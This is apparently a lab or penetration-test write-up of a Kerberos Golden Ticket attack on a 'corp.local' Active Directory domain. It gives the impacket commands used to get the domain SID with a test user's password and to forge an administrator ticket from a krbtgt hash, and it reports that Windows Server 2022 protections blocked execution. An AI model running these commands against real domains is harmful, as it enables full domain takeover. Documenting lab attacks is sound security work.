# Golden Ticket Attack

---

The golden ticket attack uses the krbtgt hash from DCSync. Which was 46e32bc92cd1d10bffa5f9191c836205. 

&nbsp;

---

## 1. Get the domain SID

```bash
impacket-getPac -targetUser administrator corp.local/j.smith:Welcome1
```
&nbsp;

![DomainSID](../screenshots/golden-ticket-domain-sid.png)

&nbsp;

Now we have the domain SID: S-1-5-21-540755161-1579015766-3725080274

&nbsp;

&nbsp;

---

## 2. Forge the Ticket

```bash
impacket-ticketer -nthash 46e32bc92cd1d10bffa5f9191c836205 -domain-sid S-1-5-21-540755161-1579015766-3725080274 -domain corp.local administrator
```

![Forged-ticket](../screenshots/golden-ticket-forged.png)

&nbsp;

You can see on the bottom the administrator.ccache has been forged. That demonstrates that Golden Ticket was forged correctly but in Windows Server 2022, Kerberos protections prevented execution.
